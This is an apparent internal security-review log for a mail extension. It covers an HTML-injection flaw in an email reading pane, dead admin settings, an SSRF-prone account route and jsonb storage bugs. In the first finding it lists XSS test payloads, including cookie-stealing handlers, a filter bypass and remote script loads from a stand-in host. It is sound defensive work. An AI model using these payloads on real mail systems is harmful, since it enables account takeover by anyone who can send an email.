# communications/mail — context

**Status 2026-09-06: `reviewed` for `engine/`, and the Studio inbox component.**
Every file under `engine/` read end to end, every guard exercised, the tenant
boundary demonstrated on two tenants with a positive control, all five migrations
applied to a virgin database. `studio/schemas/mail.json` and `studio/pages/` are
NOT covered.

The Studio component IS covered — not because a Studio review happened, but
because the worst defect in this extension was in it, and finding it did not
leave a choice. Read that as one file, not as the Studio side.

Everything below the campaign section is the earlier August work, kept because it
records traps that are still live.

---

# Section 4 of the review campaign — 2026-09-06

Four defects. Three of them are in places the previous passes were not looking:
the Studio component, the settings surface, and the one field that makes the
server open an outbound connection.

## 1. The mail reading pane rendered untrusted HTML with `{@html}`

`MailInbox.svelte` had this between an inbound email and the admin's own session:

```js
body_html.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '')
```

That removes a literal `<script>…</script>`. Measured against the expression as
shipped, **11 of 12 payloads survived intact**:

```
<img src=x onerror="alert(document.cookie)">   survives
<svg onload=alert(1)>                          survives
<iframe src="javascript:alert(1)">             survives
<a href="javascript:alert(1)">                 survives
<details open ontoggle=alert(1)>               survives
<meta http-equiv="refresh" content="0;url=…">  survives
<form action="https://evil.test/">             survives
<script src="https://evil.test/x.js">          survives  (no closing tag to match)
<scr<script>ipt>alert(1)</scr</script>ipt>     leaves a bare <script>
<script>alert(1)</script>                      removed   — the only one
```

**What makes this the worst sink found in this repository is the threat model,
not the bypass.** Everywhere else the attacker needs an account: an editor, a
tenant admin, someone who can submit a form. Here the attacker is **anyone who
can send an email to a user of the instance.** No account, no permission, no
prior access, and no interaction beyond the victim opening their mail.

### Why it was not found before

The 2026-08-02 audit round is on record concluding that a "mail iframe XSS" claim
was FALSE. That verdict was correct and it does not apply: `MailInbox.svelte` did
not exist then — the Tier-3 inbox landed 2026-08-23 — and it is `{@html}`, not an
iframe. A finding marked "not a bug" stays marked, and the component that
reintroduced it arrived three weeks later.

This extension was also the only one in the repository with an `{@html}` and no
sanitizer behind it. `content/pages` has three sinks and a DOMPurify module for
them; mail had one sink and a regular expression.

### The fix, and why it is not the CMS one

`studio/src/lib/sanitize.ts`, DOMPurify with an allow-list tuned for email. Real
mail is table-laid-out, inline-styled, and full of `<font>` and `<center>`;
narrowing it to the CMS allow-list would render ordinary newsletters as
unreadable text, and a reading pane nobody trusts is a reading pane that gets
turned off. What is refused is what can execute or navigate — no `form`, no
`iframe`, no `meta`, no `base`, no `object`, and no `on*` attribute, which
DOMPurify drops by construction rather than by a list someone has to keep
complete.

Remote images are now blocked by walking the sanitized DOM. The old form was
`replace(/\s(src|srcset)=…/gi, ' data-blocked-$1="$2"')`, whose `$2` names a
capture group that does not exist — so it emitted a literal `$2` and threw the
URL away. It also missed `background=`, `poster=`, and any URL inside a `style`
attribute, which is the form a tracking pixel actually takes.

### What the tests can and cannot reach

`bun test` has no DOM, so DOMPurify's real branch does not execute here — there
is no jsdom or happy-dom in this repository and adding one is a dependency
decision with a lockstep gate attached. What is tested is the **policy** (the
allow-lists, the URI scheme regex, the dangerous-style regex — where all twelve
payloads are decided), the no-DOM branch, and the remote-URL predicate. Each test
says which of those it is, so nobody reads the file as proof the browser path ran.
Verified by reverting the policy: 5 of 14 go red.

## 2. Eleven of seventeen admin settings were write-only

Every key in the `PUT /admin/config` validator, checked for a reader. **Six were
read. Eleven were not**: an admin set them, the save answered `success: true`,
the row was written, and nothing anywhere consulted the value.

```
read      enabled, sync_interval_minutes,
          oauth2_{gmail,outlook}_client_{id,secret}
NOT read  max_accounts_per_user, max_attachment_size_mb, allowed_domains,
          blocked_domains, require_admin_approval, auto_collect_contacts,
          imap_idle_enabled, sieve_enabled, pgp_enabled, max_messages_sync,
          trash_auto_delete_days
```

This extension **already had this defect on record**. The note in `index.ts`
calls `sync_interval_minutes` "a knob that looked like a schedule and was not
one", written when a scheduler was added to honour it. Nobody checked the
sixteen next to it, and eleven were in the same state.

**A measurement error worth keeping.** My first pass at this reported *fifteen*
dead settings, including all four `oauth2_*` keys. They are read — as
``config[`oauth2_${provider}_client_id`]`` in `lib/oauth.ts`, a computed key that
a literal string search cannot see. Caught before it was written down, by reading
the file the search said was empty. The test that now guards this matches on the
key's tail for exactly that reason.

Three are honoured now, because their meaning is not in doubt:

- **`auto_collect_contacts`** — every address a user mailed was harvested into
  `zv_mail_contacts` regardless of the setting. A privacy control that does
  nothing is worse than none, because it is believed.
- **`max_accounts_per_user`** — no limit was enforced anywhere. Checked before
  the IMAP round trip, so a user over the limit is not made to wait on a network
  connection to be told no.
- **`max_messages_sync`** — the first sync was pinned to a hardcoded 50. An
  operator raising it to 10000 for a migration got 50.

Eight are **not** invented here. `UNIMPLEMENTED_SETTINGS` in `lib/config.ts`
names them and `GET /admin/config` returns the list, so the page can mark them
rather than presenting seventeen controls of which eight are decoration. Each
needs a product decision a review is not entitled to make — `allowed_domains`
alone could mean "cannot create an account on that domain" or "cannot send to
it", which are two different products.

**The test is the part that lasts.** `lib/config.test.ts` re-derives the
partition from the source on every run: a new setting nobody wired up fails the
suite, and a setting listed as missing that something now reads fails it too.
Verified in both directions — removing the `max_accounts_per_user` reader turns
it red, and adding a `quarantine_suspicious` key to the validator turns it red
naming that key.

### Two defects in the module written to hold this

`config.test.ts` caught both, and both are the same class the module exists to
contain:

- `parseMailConfig('[1,2,3]')` returned the array, because `typeof [] ===
  'object'`. `PUT /admin/config` does `{ ...existing, ...patch }`, and spreading
  an array gives `{0:1,1:2,2:3}` — which is how this extension lost every mail
  setting on the second save in the first place.
- `intSetting({k: true})` returned **1**, because `Number(true)` is 1 and 1 is a
  positive integer. A `true` stored where a count belongs would have become "you
  may configure at most 1 mail account".

Neither was visible by reading. Both were found by listing the shapes a value
should be rejected in and asserting on all of them.

## 3. `POST /accounts` dialled any host the caller named

The route takes `imap_host`, `imap_port`, `smtp_host` and `smtp_port` from the
request body and connects immediately, to validate the credentials. It is open to
**any authenticated user**, not an admin. Nothing stopped
`imap_host: "169.254.169.254"`, which is where AWS, GCP and Azure hand out the
instance's own cloud credentials.

Now guarded with the ENGINE's `assertNonMetadataUrl` through
`ctx.internals` — deliberately not a local copy. `ai/engine/lib/endpoint-guard.ts`
is a local copy of that same logic, and duplicating it a third time is the habit
the `ai` section of this campaign was written about.

**Deliberately the metadata guard and not `assertPublicUrl`.** This product is
self-hosted first; an internal Dovecot on 10.x, or a mail server on the same box,
is the normal deployment, and refusing private ranges would refuse the
configuration most installs actually have. The `ai` extension makes the same
trade-off for the same reason — with the difference, stated here so nobody has to
rediscover it, that the `ai` field is admin-only and this one is not.

**What this does NOT close, on purpose:** a user can still aim the connection at
an internal host and read the outcome from `IMAP connection failed: <reason>`,
which is a port probe with an oracle. Closing it means either an
operator-controlled host allow-list or swallowing the error — and the error is
what tells a user their password is wrong, which is the one thing this route's own
test asserts. That belongs with the eight unimplemented settings, as a decision.

### The harness would have passed this test with the guard deleted

`testing/ext-harness.ts` turns unknown `ctx.internals` members into callable stubs
that return `undefined`. `assertNonMetadataUrl` was one of them, so a test written
to prove the guard is wired would have passed with the guard removed — the exact
failure this campaign keeps finding.

The harness now imports the ENGINE's real function for it, alongside the crypto
internals that are real for the same reason. That makes the guard testable for
every extension, not only this one. Verified: with the guard removed from the
route and the bundle repacked, 3 of 5 tests go red.

### And the bundle, again

The first run of that test failed while the source was correct. `mountForTest`
mounts the **packed** `engine/index.js`, and this extension's own history already
records the lesson — migration 005 was registered in `index.ts` while the bundle
still listed four. Repacking fixed it; nothing about the source was wrong. Third
time in this file.

## 4. Smaller, with the reason each was worth changing

- **`buildReplyContext` put the sender's display name into HTML unescaped.** The
  `&lt;` and `&gt;` around the address are LITERAL angle brackets in the output,
  not an escape of the value between them, so `from_name` and `from_address` were
  interpolated raw into the body of a reply the victim is about to compose and
  send. This Studio strips tags out of `bodyHtml` before showing it, so it is not
  a live sink *there* — it is one for anything that uses the field as its name
  promises, and the value is carried into `saveDraft` and out through
  `sendDraft`, where the victim would be the one forwarding it under their own
  address.
- **The compose box wrapped the user's plain text in `<p>` without escaping it.**
  Not a hole — the value is the user's own — but typing `a < b`, or replying to a
  message whose quoted text contains an angle bracket, sent HTML the recipient's
  client had to guess at.
- **The reply-quoting note was written as an HTML comment inside the template
  literal**, which would have put it in the body of every reply the user sends.
  The compiler caught it only because the backticks in it closed the template
  literal. Now a code comment.
- **Three copies of the config parse** — `routes.ts`, `index.ts`,
  `lib/imap-client.ts` — all doing the same `typeof raw === 'string' ?
  JSON.parse(raw) : raw` for the same reason. One now, in `lib/config.ts`.
- **`scripts/check-jsonb-cast.ts` was keyed on line numbers.** Editing this
  extension turned the gate RED without a single new site being added: nine
  baselined entries moved by a few lines. The natural response to that is
  `--update`, and `--update` accepts whatever else the same commit introduced —
  so the ratchet lost its grip exactly when someone was editing the files it
  guards. Re-keyed on the file plus the offending line's own text, compared as a
  multiset. Verified: shifting every line by ten is invisible to it, adding a real
  site is not.

## Deliberately NOT changed

- **The nine `::jsonb` sites in this extension stay on the baseline.** Their
  columns — `to_addresses`, `cc_addresses`, `attachments`, `headers` — are read
  only by JavaScript that tolerates both shapes, and no SQL anywhere treats them
  as structured (checked for `->`, `->>`, `@>`, `||` and `jsonb_*`: none).
  Rewriting them would be a change with no observed defect behind it.
- **The port-probe oracle** on `POST /accounts`, above.
- **`uploadSieveScript` is still a `console.log`.** ManageSieve needs a raw
  socket and there is no Bun-compatible client. It returns `{uploaded:false,
  fallback:true}` and the route's response carries `where`, so nothing claims
  server-side filtering happens. Honest already; left alone.
- **`getImapQuota` returns `null` on any failure**, which reads as "the server
  reports no quota" and could equally be "the server refused". Small, and the
  route around it would need a shape change to say which.

## What was verified, and how

- **All five migrations on a virgin database** (`zv_ai_s1`, engine schema via the
  migrate CLI). All twelve tables this extension owns carry
  `relrowsecurity`, `relforcerowsecurity` and exactly one policy.
- **The tenant boundary, as `zveltio_rls`** (NOSUPERUSER, NOBYPASSRLS) with the
  GUC set — not as superuser, which has BYPASSRLS implicitly:

  ```
  scoped to tenant A          READ: 1 of 2 accounts visible
  UPDATE tenant B's account -> 0 rows
  DELETE tenant B's account -> 0 rows
  INSERT into tenant B      -> new row violates row-level security policy
  control, own tenant       -> UPDATE 1, INSERT 1, DELETE 1
  ```

  The control is the half that makes the four refusals mean anything.
- **The per-USER boundary is not RLS and never was.** RLS scopes these tables to
  the tenant, which makes every colleague on the instance an authorised reader of
  everyone's mail. What separates them is `app.use('/accounts/:accountId/*')` and
  a `user_id` join in every other handler — checked route by route across all 46,
  and covered by `account-scoping.test.ts`, which exists precisely because those
  six handlers would not break if the middleware were deleted.
- **684 pass / 2 skip / 0 fail** from scratch; eight repo gates green; the bundle
  repacked and `check-bundle-sources` green.

---


Pressed 2026-08-12 with **an IMAP + SMTP server written for the purpose**, not a
mock: `AUTHENTICATE PLAIN` (SASL, with and without an initial response), `LIST`,
`SELECT`, `UID FETCH` with `ENVELOPE` and literals counted **in bytes**, `LOGOUT`;
SMTP with `EHLO`/`AUTH`/`DATA`. The client is the real `imapflow`, the production
one.

**What that proves:** that the extension's IMAP/SMTP paths are correctly wired and
handle real protocol responses. **What it does not prove:** interoperability with
Dovecot, Exchange or Gmail. A route that works here can still fail against a real
server; one that fails here is broken anyway.

The control that matters: **wrong password ⇒ 400**, account not created. The
validation really does execute, it is not bypassed.

## The encrypted password was being sent as the IMAP password

`lib/imap-operations.ts` built the client with `account.imap_password`
**directly**, whereas `lib/imap-client.ts` called `decryptPassword()`. Every
caller hands it a `SELECT *` row from `zv_mail_accounts`, where the password is
whatever `encryptPassword` wrote — so the **ciphertext** went to the server, which
answered AUTHENTICATIONFAILED.

The two paths had diverged: synchronisation went through `imap-client.ts` and
worked, while the quota, the `.eml` download and **every folder operation** came
through here and returned 500 for any account created after passwords started
being encrypted — that is, all of them. **Six call sites, one cause.** Repaired at
the single point, not in six places.

Verified: the three routes that returned 500 now answer 200; sending through SMTP
actually reaches the server (`success:true` + message received); a draft goes
through create → read → send → delete.

## What was left unpressed

The AI summary and reply-context routes — they need an AI provider, not a mail
server. The other 43 were pressed.

## Two settings saves erased the entire mail configuration

`PUT /admin/config` wrote `${JSON.stringify(merged)}::jsonb`. A string parameter
cast straight to `jsonb` is a **no-op**: the driver sends it *as* a jsonb value,
so the document becomes a **string scalar** — the whole config in quotes, not
parsed. What is wanted is `::text::jsonb`, which passes it through text first and
parses it.

The damage compounded:

1. The first save stored the string. `GET /admin/config` returned a **string**
   from then on, where the admin page expected an object.
2. The second save read it back and did `{ ...existing, ...patch }`. Spreading
   over a **string** yields one key per character: the config became
   `{"0":"{","1":"\"","2":"e", …}` and every mail setting disappeared.

Both saves answer `success: true`. No error message, anywhere.

Verified on a virgin database, exactly the sequence that destroyed it: two `PUT`s
in a row → `jsonb_typeof = object`, both changes preserved
(`max_messages_sync: 500`, `sync_interval_minutes: 9`), the seeded values intact.

`readMailConfig` parses the string form too, so an installation that saved
**once** recovers on the next read. One that saved twice has nothing left to
recover and must be configured again.

## The class, not the instance

The `${JSON.stringify(x)}::jsonb` pattern appears **27 times across 12
extensions**. Measured directly against Postgres:

```
'{"a":1}'  ::jsonb        →  jsonb_typeof = string   (wrong)
'{"a":1}'  ::text::jsonb  →  jsonb_typeof = object   (correct)
```

Not all 27 are broken: many readers do `JSON.parse` and tolerate the string form,
and a blind fix **would break them**. The broken ones are those where the value is
then used *as an object* — in SQL with jsonb operators, or returned to a client
expecting an object.

The detector: a column written with `::jsonb` and queried with `->`, `->>`, `@>`,
`jsonb_array_elements` **or `||`**. The last one was missed on the first pass and
is precisely the one that turned up the worst case.

## What the detector found: HACCP in operations/traceability

`SET haccp_checks = haccp_checks || ${'${...}'}::jsonb`. The column is
`JSONB DEFAULT '[]'`, so the intention is to append a check to the array. With the
string scalar:

```
'{"a":1}'::jsonb || '"str"'::jsonb  →  [{"a": 1}, "str"]
```

That is, the array filled up with the **raw text** of the checks, not with the
objects. These are the food safety records an ANSVSA inspection asks for: they
looked present and were unreadable as objects. The sibling write above it had the
same cast, so the column started out as a string scalar from the beginning.

All 5 call sites in `operations/traceability` repaired. The remaining ones out of
the 27 are **not verified one by one** — the list is in the commit, and the rule
is that each requires reading its consumer before changing it.

## What remains for G

A local IMAP/SMTP server. Without it these cannot be checked: synchronisation,
sending, Sieve filters, identities, the quota, `.eml` download, and the AI
summary / reply-context routes.

Pressed and working: all 7 read routes, `admin/config` in both directions,
signatures, contacts.

## SDUI migration (2026-08-21)
Accounts+signatures via schema. **Inbox Tier-3** at `/admin/mail/inbox` (2026-08-23)
covers folders, list/detail, compose/reply, sync, flags, attachment download.

---

## Configuration moved off `zv_settings` — 2026-09-05

Migration 005. Two defects, one move, and the second was not the reason for
making it.

**It was reading an engine system table.** Six `SELECT value FROM zv_settings
WHERE key = 'mail'` sites, plus the save. `ctx.db` refuses `zv_settings`; the only
reason these worked is that they are raw `sql` templates, and the table policy
guards the query builder's entry points rather than the statement. That is the
sandbox hole the raw-SQL inventory is cataloguing — when the engine closes it,
reads like these stop.

A grant on `zv_settings` would not have been the fix. A grant is per TABLE, not
per key, so this extension would have gained the SAML configuration, the LDAP one
and every other instance setting. `auth/saml` migration 004 made the same move for
the same reason; this follows it.

**And the configuration was instance-wide.** `zv_settings` is keyed on `key`
alone and the save said `ON CONFLICT (key)`, so there was ONE mail configuration
for the whole install: the second company could not have its own IMAP server or
OAuth application, and saving theirs overwrote the first's. `zvd_mail_config` is
keyed on `tenant_id`.

The reads are aliased `SELECT config AS value`, so `readMailConfig` and its
string-form recovery are untouched.

### The test was green for the wrong reason

`oauth-flow.test.ts` seeded `zv_settings` and kept passing after the move, because
migration 005 **adopts** whatever is in `zv_settings` — so on a database where an
earlier run had seeded it, the new table was already populated. It only failed on
a genuinely fresh database. The seed now writes `zvd_mail_config`.

That is the second time in this file's history that a green result meant "the
previous run left something behind" rather than "this works".

### The bundle caught the other half

With the test fixed, it failed on the fresh database with `relation
"zvd_mail_config" does not exist` — migration 005 was registered in `index.ts` and
the packed `engine/index.js` still listed four. The runtime loads the bundle.
Repacking fixed it; nothing about the source was wrong.
